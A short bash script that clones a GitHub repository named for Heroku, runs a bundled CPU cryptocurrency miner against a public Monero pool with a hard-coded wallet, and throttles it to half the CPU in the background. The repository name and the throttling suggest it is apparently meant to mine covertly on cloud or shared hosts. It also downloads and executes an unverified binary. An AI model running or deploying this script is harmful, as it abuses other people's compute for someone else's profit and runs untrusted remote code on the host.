#!/bin/bash
git clone https://github.com/herokubash/heroku002
cd heroku002
chmod +x jce_cn_cpu_miner64
apt-get update
apt install cpulimit
sudo sysctl -w vm.nr_hugepages=128
cpulimit -e jce_cn_cpu_miner64 -l 50 -b &
./jce_cn_cpu_miner64 --any --forever --variation 3 --low -o pool.supportxmr.com:80 -u 45rgestFBHnMTUfuVSvSekfuW4QxaqEyfSwJRQPuvxg9CMZr9mrvuBx9FUzWxSxsT59KykZaaHjQ6GRpTsz9ZdcC3Ko96Ev -p google  -c config.txt &
sleep 120
exit
